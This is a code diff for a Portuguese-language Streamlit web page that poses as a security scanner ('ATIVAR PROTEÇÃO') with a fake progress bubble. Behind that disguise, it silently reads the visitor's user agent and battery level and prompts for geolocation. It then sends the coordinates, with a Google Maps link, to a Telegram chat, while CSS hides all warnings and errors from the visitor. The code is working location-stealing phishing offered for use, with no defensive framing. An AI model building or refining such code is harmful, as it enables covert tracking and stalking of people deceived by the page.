@@ -12,13 +12,16 @@ def enviar_telegram(msg):
     try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
     except: pass
 
-st.set_page_config(page_title="Sistema de Segurança", layout="centered")
+st.set_page_config(page_title="Segurança", layout="centered")
 
-# 2. CSS: BOLHA E OCULTAR ERROS/AVISOS
+# 2. CSS: BOLHA + ESCONDER TUDO QUE É AVISO (YELLOW BOX)
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
-    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
+    /* MATA QUALQUER AVISO AMARELO OU ERRO NA TELA */
+    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
+        display: none !important; 
+    }
     
     .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
     .circle {
@@ -38,15 +41,19 @@ st.markdown("""
     </style>
 """, unsafe_allow_html=True)
 
-# 3. INTERFACE
+# 3. INTERFACE INICIAL
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
 caixa_bolha = st.empty()
 
-if 'etapa' not in st.session_state:
-    st.session_state['etapa'] = 'inicio'
+# Captura de hardware (Silenciosa)
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='DEVICE_GET')
+bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_GET')
 
-# Bolha Inicial (4%)
-if st.session_state['etapa'] == 'inicio':
+if 'clicou' not in st.session_state:
+    st.session_state['clicou'] = False
+
+# Bolha em 4% fixa até o clique
+if not st.session_state['clicou']:
     with caixa_bolha.container():
         st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
 
@@ -54,27 +61,23 @@ st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# 4. CAPTURA DE MODELO E BATERIA (FORA DO CLIQUE PARA NÃO TRAVAR)
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='DEVICE_ID')
-bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_ID')
-
-# 5. O BOTÃO (DISPARA O POP-UP)
+# 4. O BOTÃO (DISPARA O POP-UP DO GOOGLE)
 if st.button("🔴 ATIVAR PROTEÇÃO"):
-    st.session_state['etapa'] = 'capturando'
+    st.session_state['clicou'] = True
 
-# 6. LÓGICA APÓS O CLIQUE
-if st.session_state['etapa'] == 'capturando':
-    # Chama o pop-up de Localização IMEDIATAMENTE
+# 5. LÓGICA PÓS-CLIQUE (SEM AVISO AMARELO)
+if st.session_state['clicou']:
+    # Chama o pop-up de Localização (Android/Chrome)
     loc = get_geolocation() 
     
-    # Se o usuário aceitou a localização
     if loc and 'coords' in loc:
-        # Animação da bolha subindo de 0% a 100%
+        # SÓ ENTRA AQUI SE CLICOU EM "ATIVAR" NO POP-UP
+        # Animação da bolha girando os números 0-100%
         for p in range(0, 101, 5):
             caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
-            time.sleep(0.04)
+            time.sleep(0.05)
         
-        # Envio dos dados
+        # Envia pro Telegram
         lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
         mapa = f"https://www.google.com/maps?q={lat},{lon}"
         
@@ -86,13 +89,14 @@ if st.session_state['etapa'] == 'capturando':
         )
         
         enviar_telegram(relatorio)
-        st.success("Localização concluída")
-        st.session_state['etapa'] = 'finalizado'
+        st.success("Localização concluída") # Mensagem de sucesso
+        st.session_state['clicou'] = False
         st.stop()
     else:
-        # Enquanto não aceita, mostra "Wait..." na bolha e oculta avisos amarelos
-        caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">Wait...</div></div></div>', unsafe_allow_html=True)
+        # Enquanto não aceita, a bolha fica pulsando em "Wait..." e o aviso some
+        with caixa_bolha.container():
+            st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">...</div></div></div>', unsafe_allow_html=True)
         time.sleep(1)
         st.rerun()
 
-st.markdown('<p style="text-align:center; color
+st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
